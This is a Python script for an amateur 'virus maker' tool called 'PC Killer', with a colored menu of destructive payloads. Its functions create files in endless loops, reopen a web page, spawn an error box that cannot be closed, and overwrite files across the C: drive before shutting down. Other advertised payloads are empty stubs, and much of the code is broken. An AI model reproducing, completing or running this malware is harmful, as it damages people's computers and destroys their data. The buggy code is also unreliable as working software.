# Color and Font
# F
reset='\033[0m'
bold='\033[01m'
disable='\033[02m'
underline='\033[04m'
reverse='\033[07m'
strikethrough='\033[09m'
invisible='\033[08m'
# FG
black='\033[30m'
red='\033[31m'
green='\033[32m'
orange='\033[33m'
blue='\033[34m'
purple='\033[35m'
cyan='\033[36m'
lightgrey='\033[37m'
darkgrey='\033[90m'
lightred='\033[91m'
lightgreen='\033[92m'
yellow='\033[93m'
lightblue='\033[94m'
pink='\033[95m'
lightcyan='\033[96m'
# BG
blackg='\033[40m'
redg='\033[41m'
greeng='\033[42m'
orangeg='\033[43m'
blueg='\033[44m'
purpleg='\033[45m'
cyang='\033[46m'
lightgreyg='\033[47m'

# Library
try:
    import os
    import sys
    import time
    import shutil
    from colorama import Fore as c
    from tkinter import *
    from tkinter import messagebox
except Exception:
    print(red,' [Erorr1] Library not installed! ')

    request = input(green,' [?] Do you want to install?[y/n] ')
    if request == 'y':
        os.system('pip install sys')
        os.system('pip install time')
        os.system('pip install shutil')
        os.system('pip install tkinter')
    else:
        print(cyan,' [~] So, you must install library!')
        os.system('Suthdown')

# Function for virus:
def copyfile(number, format, text):
    n = 0
    while True:
        namefile = [i for i in range(0, number)]
        with open(namefile[n] + format, 'w') as file:
            file.write(text)

        n = n + 1

def copyfileadvanced(number, format, text, web):
    n = 0
    while True:
        namefile = [i for i in range(0, number)]
        with open(namefile[n] + format, 'w') as file:
            file.write(text)

        n = n + 1
        os.system('start ' + web)

def copypathfile():
    pass

def eternalpage(size):
    root = Tk()
    root.geometry(size)
    while True:
        messagebox.showerror('Erorr', 'You can not CLOSE this page!')

def encrypt():
    os.system('cd C:\ ')
    for folder in os.walk('.'):
        path = folder[0]
        for file in folder[2]:
            with open(file + '\\' + file, 'wb') as file:
                file.write('I changing your binnary code!')

    os.system('Shutdown')

def delete(drive):
    pass

def lockdrive():
    pass

def shutdownforever():
    pass

# Frontend:
def banner(color1, color2):
    os.system('cls')
    print(color1,'''
      _____   _____   _  ___ _ _
     |  __ \ / ____| | |/ (_) | |
     | |__) | |      | ' / _| | | ___ _ __
     |  ___/| |      |  < | | | |/ _ \ '__|
     | |    | |____  | . \| | | |  __/ |
     |_|     \_____| |_|\_\_|_|_|\___|_|   version 1.1''')
    print(color2,'''
        Developer : Sina yeganeh
        Country   : IRAN
        Tools name: Virus maker(pc killer)
        Thank from: Many tools(web)
        Use for   : Make virus''')

#c.RED + ' [' + c.WHITE + '~' + c.RED + ']'
def helplistindex():
    global num

    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '01' + c.RED + ']' + darkgrey,'Singel Virus ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '02' + c.RED + ']' + darkgrey,'Tow Viruses ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '03' + c.RED + ']' + darkgrey,'Hibrid Virus ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '04' + c.RED + ']' + darkgrey,'My Virus ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '05' + c.RED + ']' + darkgrey,'Viruses Of This Tool ')
    time.sleep(0.3)
    print(c.CYAN + ' =========================')
    print('\n' + c.RED + ' [' + c.WHITE + '99' + c.RED + ']' + darkgrey,'Exit ')
    time.sleep(0.3)
    print('\n' + c.CYAN + ' ^ PCkiller:\Home\ ')
    num = input(c.WHITE + ' $ ')

def helplistvirus():
    print('\n' + c.RED + ' [' + c.WHITE + '01' + c.RED + ']' + darkgrey,'Reproduction File')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '02' + c.RED + ']' + darkgrey,'Reproduction File In Several Path')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '03' + c.RED + ']' + darkgrey,'Reproduction A Web Page')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '04' + c.RED + ']' + darkgrey,'Indelible Page')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '05' + c.RED + ']' + darkgrey,'Encrypt Binary Code')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '06' + c.RED + ']' + darkgrey,'Delete All File Of Drive')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '07' + c.RED + ']' + darkgrey,'Drive Lock')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '08' + c.RED + ']' + darkgrey,'Repeat Restart Forever')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '09' + c.RED + ']' + darkgrey,'Hang Out Of PC')
    time.sleep(0.3)
    print(c.CYAN + ' ===================')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '99' + c.RED + ']' + darkgrey,'Exit')

def terminal(path):
    if path == '1':
        time.sleep(0.3)
        print('\n' + c.CYAN + ' ^ PCkiller:\Home\Singel-Virus\ ')
        num = input(c.WHITE + ' $ ')
    elif path == '2':
        time.sleep(0.3)
        print('\n' + c.CYAN + ' ^ PCkiller:\Home\Tow-Virus\ ')
        num = input(c.WHITE + ' $ ')
    elif path == '3':
        time.sleep(0.3)
        print('\n' + c.CYAN + ' ^ PCkiller:\Home\Hibrid-Virus\ ')
        num = input(c.WHITE + ' $ ')
    elif path == '4':
        time.sleep(0.3)
        print('\n' + c.CYAN + ' ^ PCkiller:\Home\My-Virus\ ')
        num = input(c.WHITE + ' $ ')
    elif path == '5':
        time.sleep(0.3)
        print('\n' + c.CYAN + ' ^ PCkiller:\Home\Virus-Of-This-Tool\ ')
        num = input(c.WHITE + ' $ ')
    elif path == '1a':
        time.sleep(0.3)
        print('\n' + c.CYAN + ' ^ PCkiller:\Home\Singel-Virus\Option\ ')
        num = input(c.WHITE + ' $ ')

def helplistoption():
    os.system('cls')
    banner(darkgrey, cyan)
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '01' + c.RED + ']' + darkgrey,'Notpad File ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '02' + c.RED + ']' + darkgrey,'Python File ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '03' + c.RED + ']' + darkgrey,'Exe File ')
    time.sleep(0.3)
    print('\n' + c.RED + ' [' + c.WHITE + '04' + c.RED + ']' + darkgrey,'Run Now In My System! ')
    time.sleep(0.3)

def vriusofthistool():
    print(darkgrey,' Name                      Work')
    print(cyan,' ============              ================ ')
    print(darkgrey,' ^ Reproduction file       The virus produces about 200 to 400 files per second (depending on PC speed) that you can specify extensions')
    print(darkgrey,' ^ Reproduction file In... It does exactly what the previous virus did, but it spreads all over the computer.')
    print(darkgrey,' ^ Encrypt Binary Code     Changing the binary code does not run a program. If drive c changes: The computer will no longer turn on')
    print(darkgrey,' ^ Repeat Restart Forever  A loop of turning the computer on and off.')
    print(darkgrey,' ^ Indelible Page          As the name implies.')
    print(darkgrey,' ^ Drive Lock              Locks the desired drives. Only you know the password!')
    print(darkgrey,' ^ Web Page                Repeat a Web page. You can chose URL.')
    print(c.CYAN + '\n ^ Press Enter To Back Menu...')
    input(c.WHITE + ' $ ')

# Main loop:
while True:
    banner(darkgrey, cyan)
    helplistindex()

    if num == '01':
        banner(darkgrey, cyan)
        helplistvirus()
        terminal('1')
        helplistoption()
        terminal('1a')
    elif num == '02':
        banner(darkgrey, cyan)
        helplistvirus()
        terminal('2')
    elif num == '03':
        banner(darkgrey, cyan)
        helplistvirus()
        terminal('3')
    elif num == '04':
        pass
    elif num == '05':
        banner(darkgrey, cyan)
        vriusofthistool()
    elif num == '99':
        sys.exit()
